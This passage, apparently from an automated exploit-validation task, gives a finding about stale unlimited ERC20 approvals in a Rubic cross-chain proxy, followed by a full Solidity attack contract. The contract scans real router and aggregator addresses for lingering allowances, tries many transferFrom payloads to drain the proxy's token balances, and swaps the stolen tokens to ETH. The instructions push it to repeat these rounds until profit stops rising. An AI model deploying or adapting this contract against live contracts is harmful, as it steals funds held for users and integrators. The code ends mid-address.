essive loop amplification for repeatable exploit phases.\n  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).\n  - Continue increasing only if the new round count improves total net profit.\n  - Stop at the first non-improving round count and keep the previous best result.\n  - Prefer highest total profit over earliest passing implementation.\n\nFinding:\n- title: Unlimited gateway approvals persist indefinitely and let any compromised allowlisted spender drain proxy-held ERC20 balances\n- claim: `routerCall` grants `_gateway` a `type(uint256).max` allowance whenever its current allowance is below `_amountIn`, and that approval is never revoked after the route finishes or when the address is later removed from `availableRouters`. Any allowlisted spender that later becomes malicious or compromised can therefore call `transferFrom` against the proxy at arbitrary future times.\n- impact: A compromised or retired gateway can steal all proxy-held balances of previously approved tokens, including accumulated Rubic fees, integrator fees, accidentally sent tokens, and any inventory temporarily parked in the proxy.\n- exploit_paths: [\"A user executes `routerCall` for token `T`, causing `SmartApprove` to set a max allowance from the proxy to `_gateway` for `T`.\", \"The route completes successfully, but the approval remains in place indefinitely.\", \"At any later time, `_gateway` calls `transferFrom(proxy, attacker, amount)` on token `T` and drains whatever balance the proxy currently holds.\", \"Even if admins later call `removeAvailableRouter(_gateway)`, the stale ERC20 allowance still remains active.\"]\n\nCurrent FlawVerifier.sol:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\ninterface IERC20Like {\n    function allowance(address owner, address spender) external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\ninterface IWETHLike is IERC20Like {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\ninterface IUniswapV2RouterLike {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IRubicProxyLike {\n    struct BaseCrossChainParams {\n        address srcInputToken;\n        uint256 srcInputAmount;\n        uint256 dstChainID;\n        address dstOutputToken;\n        uint256 dstMinOutputAmount;\n        address recipient;\n        address integrator;\n        address router;\n    }\n\n    function getAvailableRouters() external view returns (address[] memory);\n    function fixedCryptoFee() external view returns (uint256);\n    function RubicPlatformFee() external view returns (uint256);\n    function minTokenAmount(address token) external view returns (uint256);\n    function maxTokenAmount(address token) external view returns (uint256);\n    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;\n}\n\ncontract FlawVerifier {\n    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;\n\n    address internal constant WETH = address(uint160(0x00C02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));\n    address internal constant UNISWAP_V2 = address(uint160(0x007a250d5630B4cF539739dF2C5dAcb4c659F2488D));\n    address internal constant SUSHISWAP = address(uint160(0x00d9e1CE17f2641F24aE83637ab66a2cca9C378B9F));\n\n    address private _profitToken;\n    uint256 private _profitAmount;\n    uint256 private _nativeBaseline;\n    bool private _executed;\n    bool private _validated;\n    bool private _staleApprovalObserved;\n    string private _path;\n    string private _verdict;\n\n    constructor() {\n        _path =\n            \"routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance persists -> compromised _gateway later reuses transferFrom(proxy, attacker, amount) to drain proxy-held ERC20 balances -> removing that router/gateway from availableRouters never revokes the old token approval\";\n        _verdict = \"refuted\";\n    }\n\n    receive() external payable {}\n\n    function executeOnOpportunity() external {\n        if (_executed) {\n            return;\n        }\n        _executed = true;\n        _nativeBaseline = address(this).balance;\n\n        address[] memory currentRouters = _currentRouters();\n        address[] memory spenderCandidates = _spenderCandidates(currentRouters);\n        address[] memory tokens = _candidateTokens();\n\n        _runAmplificationRound(currentRouters, spenderCandidates, tokens);\n        _runAmplificationRound(currentRouters, spenderCandidates, tokens);\n\n        uint256 bestScore = _currentScore();\n        for (uint256 rounds = 3; rounds <= 6; rounds++) {\n            _runAmplificationRound(currentRouters, spenderCandidates, tokens);\n            uint256 newScore = _currentScore();\n            if (newScore <= bestScore) {\n                break;\n            }\n            bestScore = newScore;\n        }\n\n        _syncReportedProfit();\n\n        if (bestScore > 0) {\n            _validated = true;\n            _verdict = \"validated\";\n            return;\n        }\n\n        if (_staleApprovalObserved) {\n            _path =\n                \"Observed stale ERC20 approvals from the proxy to current or historical gateway/router spenders, but this fork did not expose a public attacker-callable spender surface that converted those lingering approvals into net profitable transferFrom(proxy, attacker, amount) drains.\";\n        } else {\n            _path =\n                \"This fork did not expose a live persisted approval from the proxy to the scanned current-or-historical spender set for the scanned token universe, so the core stale-approval precondition was not established.\";\n        }\n    }\n\n    function profitToken() external view returns (address) {\n        return _profitToken;\n    }\n\n    function profitAmount() external view returns (uint256) {\n        return _profitAmount;\n    }\n\n    function exploitPath() external view returns (string memory) {\n        return _path;\n    }\n\n    function validatedOrRefuted() external view returns (string memory) {\n        return _verdict;\n    }\n\n    function staleApprovalObserved() external view returns (bool) {\n        return _staleApprovalObserved;\n    }\n\n    function validated() external view returns (bool) {\n        return _validated;\n    }\n\n    function _runAmplificationRound(\n        address[] memory currentRouters,\n        address[] memory spenderCandidates,\n        address[] memory tokens\n    ) internal {\n        for (uint256 i = 0; i < tokens.length; i++) {\n            address token = tokens[i];\n            uint256 proxyBalance = _balanceOf(token, TARGET);\n            if (proxyBalance == 0) {\n                continue;\n            }\n\n            proxyBalance = _drainObservedStaleApprovals(token, proxyBalance, spenderCandidates);\n            if (proxyBalance != 0) {\n                proxyBalance = _seedFreshApprovalAndDrain(token, proxyBalance, currentRouters);\n            }\n\n            if (proxyBalance != 0) {\n                proxyBalance = _drainObservedStaleApprovals(token, proxyBalance, spenderCandidates);\n            }\n\n            _realizeToken(token);\n        }\n\n        _syncReportedProfit();\n    }\n\n    function _drainObservedStaleApprovals(\n        address token,\n        uint256 proxyBalance,\n        address[] memory spenderCandidates\n    ) internal returns (uint256) {\n        for (uint256 i = 0; i < spenderCandidates.length; i++) {\n            address spender = spenderCandidates[i];\n            if (spender.code.length == 0) {\n                continue;\n            }\n\n            uint256 approval = _allowance(token, TARGET, spender);\n            if (approval == 0) {\n                continue;\n            }\n\n            _staleApprovalObserved = true;\n            uint256 amount = approval < proxyBalance ? approval : proxyBalance;\n            if (amount == 0) {\n                continue;\n            }\n\n            if (_attemptGatewayDrain(spender, token, TARGET, address(this), amount)) {\n                proxyBalance = _balanceOf(token, TARGET);\n                if (proxyBalance == 0) {\n                    return 0;\n                }\n            }\n        }\n\n        return proxyBalance;\n    }\n\n    function _seedFreshApprovalAndDrain(\n        address token,\n        uint256 observedProxyBalance,\n        address[] memory currentRouters\n    ) internal returns (uint256) {\n        if (observedProxyBalance == 0 || address(this).balance == 0 || currentRouters.length == 0) {\n            return observedProxyBalance;\n        }\n\n        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(token);\n        if (grossAmount == 0 || amountIn == 0 || address(this).balance <= fixedFee) {\n            return observedProxyBalance;\n        }\n\n        if (_sourceToken(token, grossAmount) < grossAmount) {\n            return observedProxyBalance;\n        }\n        if (!_forceApprove(token, TARGET, grossAmount)) {\n            return observedProxyBalance;\n        }\n\n        if (_trySeedAcrossPairs(token, grossAmount, amountIn, fixedFee, currentRouters)) {\n            return _balanceOf(token, TARGET);\n        }\n\n        return observedProxyBalance;\n    }\n\n    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {\n        fixedFee = _readUint(TARGET, bytes4(keccak256(\"fixedCryptoFee()\")));\n        grossAmount = IRubicProxyLike(TARGET).minTokenAmount(token);\n        if (grossAmount == 0) {\n            grossAmount = _defaultSeedAmount(token);\n        }\n        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);\n        if (maxAmount != 0 && grossAmount > maxAmount) {\n            grossAmount = maxAmount;\n        }\n        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();\n        amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);\n    }\n\n    function _trySeedAcrossPairs(\n        address token,\n        uint256 grossAmount,\n        uint256 amountIn,\n        uint256 fixedFee,\n        address[] memory currentRouters\n    ) internal returns (bool) {\n        for (uint256 gatewayIndex = 0; gatewayIndex < currentRouters.length; gatewayIndex++) {\n            address gateway = currentRouters[gatewayIndex];\n            if (gateway.code.length == 0) {\n                continue;\n            }\n\n            for (uint256 routerIndex = 0; routerIndex < currentRouters.length; routerIndex++) {\n                address router = currentRouters[routerIndex];\n                if (router.code.length == 0) {\n                    continue;\n                }\n\n                if (_trySeedWithRouterAndGateway(router, gateway, token, grossAmount, amountIn, fixedFee)) {\n                    _staleApprovalObserved = true;\n                    _path =\n                        \"A user executes routerCall for token T, which sets a max approval from the proxy to an allowlisted gateway. The route succeeds because an allowlisted router publicly forwards a call into that same gateway, causing gateway.transferFrom(proxy, attacker, amountIn). The approval then persists and the compromised gateway reuses the same public spender surface to drain the proxy's remaining balance. Removing the gateway/router from availableRouters later would not revoke the ERC20 approval.\";\n\n                    uint256 remaining = _balanceOf(token, TARGET);\n                    if (remaining != 0) {\n                        _attemptGatewayDrain(gateway, token, TARGET, address(this), remaining);\n                    }\n                    return true;\n                }\n            }\n        }\n        return false;\n    }\n\n    function _trySeedWithRouterAndGateway(\n        address router,\n        address gateway,\n        address token,\n        uint256 grossAmount,\n        uint256 amountIn,\n        uint256 fixedFee\n    ) internal returns (bool) {\n        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({\n            srcInputToken: token,\n            srcInputAmount: grossAmount,\n            dstChainID: 1,\n            dstOutputToken: token,\n            dstMinOutputAmount: 0,\n            recipient: address(this),\n            integrator: address(0),\n            router: router\n        });\n\n        bytes[14] memory gatewayPayloads = _gatewayPayloads(token, TARGET, address(this), amountIn);\n\n        if (router == gateway) {\n            for (uint256 i = 0; i < gatewayPayloads.length; i++) {\n                bytes memory directPayload = gatewayPayloads[i];\n                if (directPayload.length == 0) {\n                    continue;\n                }\n                if (_tryRouterCall(params, gateway, token, fixedFee, directPayload)) {\n                    return true;\n                }\n            }\n        }\n\n        for (uint256 i = 0; i < gatewayPayloads.length; i++) {\n            bytes memory gatewayPayload = gatewayPayloads[i];\n            if (gatewayPayload.length == 0) {\n                continue;\n            }\n\n            bytes[10] memory routerPayloads = _routerForwardPayloads(gateway, gatewayPayload);\n            for (uint256 j = 0; j < routerPayloads.length; j++) {\n                bytes memory routerPayload = routerPayloads[j];\n                if (routerPayload.length == 0) {\n                    continue;\n                }\n                if (_tryRouterCall(params, gateway, token, fixedFee, routerPayload)) {\n                    return true;\n                }\n            }\n        }\n\n        return false;\n    }\n\n    function _tryRouterCall(\n        IRubicProxyLike.BaseCrossChainParams memory params,\n        address gateway,\n        address token,\n        uint256 fixedFee,\n        bytes memory data\n    ) internal returns (bool) {\n        uint256 beforeLocal = _balanceOf(token, address(this));\n        (bool ok, ) = TARGET.call{value: fixedFee}(\n            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)\n        );\n        uint256 afterLocal = _balanceOf(token, address(this));\n        if (!ok || afterLocal <= beforeLocal) {\n            return false;\n        }\n\n        _recordTokenProfit(token, afterLocal - beforeLocal, _path);\n        return true;\n    }\n\n    function _attemptGatewayDrain(\n        address gateway,\n        address token,\n        address proxy,\n        address attacker,\n        uint256 amount\n    ) internal returns (bool) {\n        bytes[14] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);\n        string[14] memory paths;\n\n        paths[0] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount) directly\";\n        paths[1] = \"routerCall -> stale max allowance persists -> compromised gateway calls pullToken(token, proxy, attacker, amount)\";\n        paths[2] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(token, proxy, attacker, amount)\";\n        paths[3] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, amount, token)\";\n        paths[4] = \"routerCall -> stale max allowance persists -> compromised gateway calls transferFrom(proxy, attacker, uint160(amount), token)\";\n        paths[5] = \"routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount)\";\n        paths[6] = \"routerCall -> stale max allowance persists -> compromised gateway executes token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[7] = \"routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount)\";\n        paths[8] = \"routerCall -> stale max allowance persists -> compromised gateway calls token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[9] = \"routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount)\";\n        paths[10] = \"routerCall -> stale max allowance persists -> compromised gateway runs token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[11] = \"routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount)\";\n        paths[12] = \"routerCall -> stale max allowance persists -> compromised gateway execs token.transferFrom(proxy, attacker, amount) with value arg\";\n        paths[13] = \"routerCall -> stale max allowance persists -> compromised gateway functionCalls token.transferFrom(proxy, attacker, amount)\";\n\n        for (uint256 i = 0; i < payloads.length; i++) {\n            bytes memory payload = payloads[i];\n            if (payload.length == 0) {\n                continue;\n            }\n\n            uint256 beforeBalance = _balanceOf(token, address(this));\n            (bool ok, ) = gateway.call(payload);\n            uint256 afterBalance = _balanceOf(token, address(this));\n            if (!ok || afterBalance <= beforeBalance) {\n                continue;\n            }\n\n            _recordTokenProfit(token, afterBalance - beforeBalance, paths[i]);\n            return true;\n        }\n\n        return false;\n    }\n\n    function _realizeToken(address token) internal {\n        uint256 balance = _balanceOf(token, address(this));\n        if (balance == 0) {\n            return;\n        }\n\n        if (token == WETH) {\n            IWETHLike(WETH).withdraw(balance);\n            _syncReportedProfit();\n            return;\n        }\n\n        uint256 beforeNative = address(this).balance;\n        if (_swapTokenForEth(token, balance, UNISWAP_V2) || _swapTokenForEth(token, balance, SUSHISWAP)) {\n            uint256 gained = address(this).balance - beforeNative;\n            if (gained > 0) {\n                _profitToken = address(0);\n                _profitAmount = _currentNativeProfit();\n                _validated = true;\n                _verdict = \"validated\";\n                return;\n            }\n        }\n\n        _recordTokenProfit(token, balance, _path);\n    }\n\n    function _swapTokenForEth(address token, uint256 amount, address router) internal returns (bool) {\n        if (!_forceApprove(token, router, amount)) {\n            return false;\n        }\n\n        address[] memory path = new address[](2);\n        path[0] = token;\n        path[1] = WETH;\n\n        uint256 beforeNative = address(this).balance;\n        (bool ok, ) = router.call(\n            abi.encodeWithSelector(\n                IUniswapV2RouterLike.swapExactTokensForETHSupportingFeeOnTransferTokens.selector,\n                amount,\n                0,\n                path,\n                address(this),\n                block.timestamp\n            )\n        );\n        return ok && address(this).balance > beforeNative;\n    }\n\n    function _sourceToken(address token, uint256 desiredAmount) internal returns (uint256) {\n        if (token == WETH) {\n            uint256 toWrap = desiredAmount;\n            if (toWrap > address(this).balance) {\n                toWrap = address(this).balance;\n            }\n            if (toWrap == 0) {\n                return 0;\n            }\n            IWETHLike(WETH).deposit{value: toWrap}();\n            return _balanceOf(WETH, address(this));\n        }\n\n        if (address(this).balance == 0) {\n            return 0;\n        }\n\n        address[] memory path = new address[](2);\n        path[0] = WETH;\n        path[1] = token;\n\n        uint256 maxSpend = address(this).balance;\n        if (maxSpend > 5 ether) {\n            maxSpend = 5 ether;\n        }\n\n        uint256 beforeBalance = _balanceOf(token, address(this));\n        (bool ok, ) = UNISWAP_V2.call{value: maxSpend}(\n            abi.encodeWithSignature(\n                \"swapETHForExactTokens(uint256,address[],address,uint256)\",\n                desiredAmount,\n                path,\n                address(this),\n                block.timestamp\n            )\n        );\n        if (!ok) {\n            (ok, ) = SUSHISWAP.call{value: maxSpend}(\n                abi.encodeWithSignature(\n                    \"swapETHForExactTokens(uint256,address[],address,uint256)\",\n                    desiredAmount,\n                    path,\n                    address(this),\n                    block.timestamp\n                )\n            );\n        }\n        if (!ok) {\n            return 0;\n        }\n\n        return _balanceOf(token, address(this)) - beforeBalance;\n    }\n\n    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {\n        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));\n        if (_callSucceeded(ok, ret)) {\n            return true;\n        }\n\n        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));\n        if (!_callSucceeded(ok, ret)) {\n            return false;\n        }\n\n        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));\n        return _callSucceeded(ok, ret);\n    }\n\n    function _recordTokenProfit(address token, uint256 amount, string memory successfulPath) internal {\n        if (amount == 0) {\n            return;\n        }\n\n        uint256 nativeProfit = _currentNativeProfit();\n        if (nativeProfit > 0) {\n            _profitToken = address(0);\n            _profitAmount = nativeProfit;\n            _path = successfulPath;\n            _validated = true;\n            _verdict = \"validated\";\n            return;\n        }\n\n        if (token == _profitToken) {\n            _profitAmount += amount;\n            _path = successfulPath;\n            return;\n        }\n\n        if (_profitAmount == 0 || amount > _profitAmount) {\n            _profitToken = token;\n            _profitAmount = amount;\n            _path = successfulPath;\n        }\n    }\n\n    function _syncReportedProfit() internal {\n        uint256 nativeProfit = _currentNativeProfit();\n        if (nativeProfit > 0) {\n            _profitToken = address(0);\n            _profitAmount = nativeProfit;\n            _validated = true;\n            _verdict = \"validated\";\n        }\n    }\n\n    function _currentScore() internal view returns (uint256) {\n        uint256 nativeProfit = _currentNativeProfit();\n        if (nativeProfit > 0) {\n            return nativeProfit;\n        }\n        return _profitAmount;\n    }\n\n    function _currentNativeProfit() internal view returns (uint256) {\n        uint256 balance = address(this).balance;\n        return balance > _nativeBaseline ? balance - _nativeBaseline : 0;\n    }\n\n    function _currentRouters() internal view returns (address[] memory merged) {\n        address[] memory live = IRubicProxyLike(TARGET).getAvailableRouters();\n        address[] memory defaults = new address[](4);\n        defaults[0] = address(uint160(0x00663dc15d3c1ac63ff12e45ab68fea3f0a883c251));\n        defaults[1] = address(uint160(0x00362fa9d0bca5d19f743db50738345ce2b40ec99f));\n        defaults[2] = address(uint160(0x00b9e13785127bffcc3dc970a55f6c7bf0844a3c15));\n        defaults[3] = address(uint160(0x0003b7551eb0162c838a10c2437b60d1f5455b9554));\n\n        merged = new address[](live.length + defaults.length);\n        uint256 count;\n\n        for (uint256 i = 0; i < live.length; i++) {\n            if (!_contains(merged, count, live[i])) {\n                merged[count++] = live[i];\n            }\n        }\n        for (uint256 i = 0; i < defaults.length; i++) {\n            if (!_contains(merged, count, defaults[i])) {\n                merged[count++] = defaults[i];\n            }\n        }\n\n        assembly {\n            mstore(merged, count)\n        }\n    }\n\n    function _spenderCandidates(address[] memory currentRouters) internal pure returns (address[] memory spenders) {\n        address[] memory extras = new address[](12);\n        extras[0] = address(uint160(0x001111111254fb6c44bac0bed2854e76f90643097d));\n        extras[1] = address(uint160(0x001111111254EEB25477B68fb85Ed929f73A960582));\n        extras[2] = address(uint160(0x00Def1C0ded9bec7F1a1670819833240f027b25EfF));\n        extras[3] = address(uint160(0x000000000000001ff3684f28c67538d4d072C22734));\n        extras[4] = address(uint160(0x00DEF171Fe48CF0115B1d80b88dc8eAB59176FEe57));\n        extras[5] = address(uint160(0x00216B4B4Ba9F3e719726886d34a177484278BFcae));\n        extras[6] = address(uint160(0x001231DEB6f5749Ef6ce6943a275A1D3E7486F4EaE));\n        extras[7] = address(uint160(0x006352a56caadc4F1e25cd6C75970fa768A3304e64));\n        extras[8] = address(uint160(0x00765277EebeCA2e31912C9946eAe1021199B39C61));\n        extras[9] = address(uint160(0x005427FEFA711EfF984124BFBB1AB6fBf5E3Da1820));\n        extras[10] = address(uint160(0x00E592427A0AEce92De3Edee1F18E0157C05861564));\n        extras[11] = address(uint160(0x0068b3465833fb72A70ecDF485E0e4C7bD8665Fc45));\n\n        spenders = new address[](currentRouters.length + extras.length);\n        uint256 count;\n        for (uint256 i = 0; i < currentRouters.length; i++) {\n            if (!_contains(spenders, count, currentRouters[i])) {\n                spenders[count++] = currentRouters[i];\n            }\n        }\n        for (uint256 i = 0; i < extras.length; i++) {\n            if (!_contains(spenders, count, extras[i])) {\n                spenders[count++] = extras[i];\n            }\n        }\n\n        assembly {\n            mstore(spenders, count)\n        }\n    }\n\n    function _candidateTokens() internal pure returns (address[] memory tokens) {\n        tokens = new address[](24);\n        tokens[0] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC\n        tokens[1] = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // USDT\n        tokens[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI\n        tokens[3] = WETH;\n        tokens[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // WBTC\n        tokens[5] = 0x853d955aCEf822Db058eb8505911ED77F175b99e; // FRAX\n        tokens[6] = 0x4Fabb145d64652a948d72533023f6E7A623C7C53; // BUSD\n        tokens[7] = 0x0000000000085d4780B73119b644AE5ecd22b376; // TUSD\n        tokens[8] = 0x1456688345527bE1f37E9e627DA0837D6f08C925; // USDP\n        tokens[9] = 0x514910771AF9Ca656af840dff83E8264EcF986CA; // LINK\n        tokens[10] = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0; // MATIC\n        tokens[11] = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984; // UNI\n        tokens[12] = address(uint160(0x007Fc66500c84A76Ad7e9c93437bFc5Ac33E2DdAE9)); // AAVE\n        tokens[13] = address(uint160(0x006B3595068778DD592e39A122f4f5a5Cf09C90fE2)); // SUSHI\n        tokens[14] = 0xD533a949740bb3306d119CC777fa900bA034cd52; // CRV\n        tokens[15] = address(uint160(0x004e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); // CVX\n        tokens[16] = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; // SHIB\n        tokens[17] = 0x111111111117dC0aa78b770fA6A738034120C302; // 1INCH\n        tokens[18] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e; // YFI\n        tokens[19] = 0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32; // LDO\n        tokens[20] = 0xba100000625a3754423978a60c9317c58a424